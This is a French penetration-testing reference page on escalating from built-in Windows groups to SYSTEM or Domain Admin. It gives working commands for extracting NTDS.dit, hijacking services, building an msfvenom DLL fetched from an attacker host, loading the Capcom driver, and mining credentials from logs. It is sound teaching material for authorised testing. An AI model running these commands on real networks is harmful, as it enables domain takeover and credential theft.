# Groupes privilegies Windows

Certains groupes Windows integres conferent des privileges qui permettent une escalade vers SYSTEM ou Domain Admin. Ces groupes sont souvent utilises pour deleguer des taches d'administration specifiques sans accorder un acces complet, mais les privileges qu'ils accordent sont regulierement sous-estimes.

## Pourquoi

En environnement Active Directory, les administrateurs ajoutent des comptes a des groupes comme Backup Operators ou DnsAdmins pour des besoins legitimes (sauvegardes automatisees, gestion DNS). Ces comptes sont rarement surveilles avec la meme rigueur que les Domain Admins. Si on compromet un compte membre de ces groupes, les privileges herites offrent des chemins d'escalade directs et bien documentes.

## Comment ca marche

### Groupes a surveiller

| Groupe | Privileges cles | Impact potentiel |
|---|---|---|
| **Backup Operators** | SeBackupPrivilege, SeRestorePrivilege | Lecture/ecriture de tout fichier, extraction de NTDS.dit |
| **Server Operators** | SeBackupPrivilege, SeRestorePrivilege, controle des services | Modification de services SYSTEM |
| **DnsAdmins** | Chargement de DLL custom dans le service DNS | Execution de code en SYSTEM sur le DC |
| **Print Operators** | SeLoadDriverPrivilege | Chargement de drivers noyau vulnerables |
| **Hyper-V Administrators** | Controle complet des VMs | Clonage de DC virtualises, extraction de NTDS.dit |
| **Event Log Readers** | Lecture des journaux de securite | Extraction de credentials passes en ligne de commande |

{% hint style="info" %}
La commande `whoami /groups` revele les appartenances aux groupes. En pentest, verifier systematiquement si le compte compromis est membre d'un de ces groupes avant de chercher des vecteurs plus complexes.
{% endhint %}

## En pratique

### Backup Operators

```powershell
# - Verifier l'appartenance au groupe
whoami /groups | findstr "Backup"

# - Importer les modules d'exploitation
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# - Activer le privilege
Set-SeBackupPrivilege

# - Copier un fichier protege (ignore les ACL)
Copy-FileSeBackupPrivilege 'C:\Confidential\passwords.txt' .\passwords.txt

# - Sur un DC : extraire NTDS.dit via diskshadow
# Creer un script diskshadow
echo "set context persistent nowriters" > script.txt
echo "add volume c: alias myalias" >> script.txt
echo "create" >> script.txt
echo "expose %myalias% z:" >> script.txt

# Executer diskshadow
diskshadow /s script.txt

# Copier NTDS.dit depuis la copie shadow
Copy-FileSeBackupPrivilege 'Z:\Windows\NTDS\ntds.dit' .\ntds.dit
```

{% hint style="danger" %}
Sur un controleur de domaine, SeBackupPrivilege permet d'extraire la totalite de la base Active Directory. C'est un acces equivalent a Domain Admin en termes de donnees recuperables.
{% endhint %}

### Server Operators

```cmd
# - Verifier l'appartenance au groupe
net localgroup "Server Operators"

# - Les Server Operators ont SERVICE_ALL_ACCESS sur certains services
# Verifier avec PsService
PsService.exe security AppReadiness
# [ALLOW] BUILTIN\Server Operators
#         All

# - Modifier le binpath d'un service SYSTEM
sc config AppReadiness binpath= "cmd /c net localgroup administrators <user> /add"

# - Arreter puis redemarrer le service
sc stop AppReadiness
sc start AppReadiness

# - Verifier l'ajout au groupe admin
net localgroup administrators
```

### DnsAdmins

{% tabs %}
{% tab title="DLL malveillante" %}
```bash
# - Sur la machine attaquante : generer une DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll

# - Partager via SMB ou HTTP
python3 -m http.server 7777
```
{% endtab %}
{% tab title="Exploitation" %}
```powershell
# - Verifier l'appartenance au groupe
Get-ADGroupMember -Identity DnsAdmins

# - Telecharger la DLL sur la cible
wget "http://<IP_ATTAQUANT>:7777/adduser.dll" -OutFile "C:\Temp\adduser.dll"

# - Configurer le plugin DNS
dnscmd.exe /config /serverlevelplugindll C:\Temp\adduser.dll

# - Redemarrer le service DNS (necessite des droits)
sc stop dns
sc start dns

# La DLL est chargee par le service DNS (NT AUTHORITY\SYSTEM)
# Le compte est ajoute au groupe Domain Admins
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
L'attaque DnsAdmins necessite un redemarrage du service DNS. Sur un DC en production, cela peut causer une interruption de la resolution DNS pour tout le domaine. Coordonner avec le client avant d'executer.
{% endhint %}

### Event Log Readers

```powershell
# - Verifier l'appartenance au groupe
net localgroup "Event Log Readers"

# - Rechercher des credentials dans les logs de securite avec wevtutil
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Process Command Line: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword

# - Avec des credentials specifiques
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

# - Via PowerShell (necessite des droits admin ou permissions ajustees)
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

{% hint style="info" %}
Les commandes Windows comme `net use`, `runas` et `cmdkey` passent souvent des credentials en clair sur la ligne de commande. Si l'audit des processus (Event ID 4688) est active, ces credentials sont enregistres dans les journaux de securite.
{% endhint %}

### Print Operators

```cmd
# - Verifier les privileges (depuis un contexte eleve)
whoami /priv
# SeLoadDriverPrivilege    Load and unload device drivers    Disabled

# - Compiler le PoC EnableSeLoadDriverPrivilege
# (necessite Visual Studio Developer Command Prompt)
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

# - Ajouter une reference au driver Capcom.sys dans le registre
reg add HKCU\System\CurrentControlSet\YOURNAME /v ImagePath /t REG_SZ /d "\??\C:\Temp\Capcom.sys"

# - Executer le PoC pour charger le driver
EnableSeLoadDriverPrivilege.exe

# - Utiliser ExploitCapcom.exe pour obtenir un shell SYSTEM
ExploitCapcom.exe
# [*] Capcom.sys exploit
# [*] Capcom.sys opened
# [*] Running payload...
# [*] cmd.exe started as SYSTEM
```

### Hyper-V Administrators

```cmd
# - Si le DC est virtualise, les Hyper-V Admins peuvent :
# 1. Cloner la VM du DC
# 2. Monter le VHDX hors ligne
# 3. Extraire NTDS.dit et la cle SYSTEM

# - Exploitation via hard link (si vulnerable)
# Le service vmms.exe restaure les permissions sur les fichiers .vhdx en tant que SYSTEM
# On peut rediriger vers un fichier systeme protege

# - Alternative : exploitation d'un service tiers
# Exemple avec Mozilla Maintenance Service
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
# Remplacer par un binaire malveillant
sc.exe start MozillaMaintenance
```

## Pieges et galeres

- **UAC et Print Operators** : SeLoadDriverPrivilege n'apparait pas dans un contexte non eleve. Il faut contourner l'UAC d'abord pour voir et utiliser le privilege
- **DnsAdmins et chemin de la DLL** : le chemin complet de la DLL doit etre specifie, y compris le lecteur. Un chemin relatif fait echouer l'attaque silencieusement
- **DnsAdmins sans redemarrage** : le service DNS doit etre redemarrer pour que la DLL soit chargee. Si on ne peut pas redemarrer le service, l'attaque ne fonctionne pas
- **Event Log Readers et Get-WinEvent** : l'acces au journal Security via PowerShell necessite des permissions supplementaires (registre). `wevtutil` est plus fiable dans ce contexte
- **Hyper-V et mitigation** : la technique de hard link pour Hyper-V Admins a ete corrigee dans les mises a jour de mars 2020. Sur les systemes patchs, chercher d'autres vecteurs
- **Server Operators et services** : tous les services ne demarrent pas avec les permissions des Server Operators. Verifier avec `PsService.exe security <service>` avant d'essayer

## Memo express

| Groupe | Commande cle | Resultat |
|---|---|---|
| Backup Operators | `Copy-FileSeBackupPrivilege <src> <dst>` | Copie de fichiers proteges |
| Server Operators | `sc config <svc> binpath= "cmd /c <cmd>"` | Execution en SYSTEM via service |
| DnsAdmins | `dnscmd.exe /config /serverlevelplugindll <dll>` | Chargement de DLL en SYSTEM |
| Event Log Readers | `wevtutil qe Security /rd:true /f:text` | Extraction de credentials des logs |
| Print Operators | `EnableSeLoadDriverPrivilege.exe` | Chargement de driver vulnerable |
| Hyper-V Admins | Clonage de VM + extraction NTDS.dit | Acces Domain Admin |
| Verification | `whoami /groups` | Groupes du compte courant |

***
